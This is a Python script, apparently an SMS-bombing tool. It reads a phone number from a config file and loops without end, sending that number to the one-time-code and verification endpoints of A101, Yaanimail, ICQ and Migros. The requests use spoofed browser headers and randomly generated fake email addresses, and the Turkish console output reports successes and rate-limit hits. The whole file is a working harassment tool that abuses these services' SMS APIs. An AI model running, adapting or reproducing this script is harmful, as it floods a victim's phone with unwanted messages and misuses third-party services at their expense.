import random
import requests
import time
import json
from colorama import Fore, init

with open('config.json','r') as f:
    numara = json.load(f)

number = str(numara["Numara"])
client = requests.session()
while True:
    #A101
    headers = {
        "content-type": "application/x-www-form-urlencoded;",
        "origin": "https://www.a101.com.tr",
        "referer": "https://www.a101.com.tr/login/?next=/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest"
    }
    data = {
        "phone": "0"+number,
        "next":"/"
    }
    send = client.post('https://www.a101.com.tr/users/otp-login/',headers=headers,data=data)
    if 'Telefon numaranız başında 0 olacak şekilde 11 haneden oluşmalıdır.' in send.text:
        init(autoreset=True)
        print(Fore.RED+'Gönderim Başarısız.')
    elif 'Üst üste çok fazla giriş denemesi yapılmıştır.' in send.text:
        init(autoreset=True)
        print(Fore.RED+'Zaman Aşımı. A101')
    elif 'Üst üste çok fazla istek yapıldı.' in send.text:
        init(autoreset=True)
        print(Fore.RED+'Zaman Aşımı. A101')
    else:
        init(autoreset=True)
        print(Fore.GREEN+'Gönderim Başarılı. A101')
    key = 'abcdefghijklmnoprstuvyz'
    random_key = ''.join(random.choice(key) for i in range(10))
    random_key = str(random_key)
    #Yaanimail
    headers2 = {
        "Content-Type": "application/json",
        "Device-ID": "0b67f31c-fd3e-498a-bdc5-fd6e0f64ae5d",
        "Device-Language": "tr_TR",
        "Device-Name": "Windows - Chrome 104.0.0.0",
        "Device-OS": "WEB",
        "Host": "api.yaanimail.com",
        "Origin": "https://yaanimail.com",
        "Referer": "https://yaanimail.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
    }

    data2 = json.dumps({"email":"bs"+random_key+"@yaani.com","language":"tr","recovery_options":[{"type":"msisdn","value":"90"+number}],"action":"create"})
    send2 = client.post('https://api.yaanimail.com/gateway/v1/accounts/verification-code/send',headers=headers2,data=data2)
    if 204 == send.status_code:
        init(autoreset=True)
        print(Fore.GREEN+'Gönderim Başarılı. Yaanimail ')
    elif 200 == send.status_code:
        init(autoreset=True)
        print(Fore.GREEN+'Gönderim Başarılı. Yaanimail ')
    elif 429 == send.status_code:
        init(autoreset=True)
        print(Fore.RED+'Zaman Aşımı. Yaanimail')
    else:
        init(autoreset=True)
        print(Fore.RED+'Gönderim Başarısız. Yaanimail')
    #ICQ
    headers3 = {
        "content-type": "application/json",
        "language": "tr",
        "origin": "https://web.icq.com",
        "referer": "https://web.icq.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
    }

    data3 = json.dumps({"reqId":"5062-1662150555","params":{"phone":"90"+number,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

    send3 = requests.post('https://u.icq.net/api/v86/rapi/auth/sendCode',headers=headers3,data=data3)
    if '20000' in send3.text:
        init(autoreset=True)
        print(Fore.GREEN+'Gönderim Başarılı. ICQ')
    else:
        init(autoreset=True)
        print(Fore.RED+'Gönderim Başarısız. ICQ')
    #Migros
    headers4 = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Referer": "https://www.migros.com.tr/kayit",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "X-FORWARDED-REST": "true",
        "X-PWA": "true"
    }
    data4 = json.dumps({"email":random_key+"@mail.com","phoneNumber":number})
    send4 = client.post('https://www.migros.com.tr/rest/users/v2/register/otp?reid=1662152100882000002',data=data4,headers=headers4)
    if "phoneNumberClaimExpireInSeconds" in send4.text:
        init(autoreset=True)
        print(Fore.GREEN+'Gönderim Başarılı. MİGROS')
    else:
        init(autoreset=True)
        print(Fore.RED+'Gönderim Başarısız. MİGROS')
    time.sleep(10)
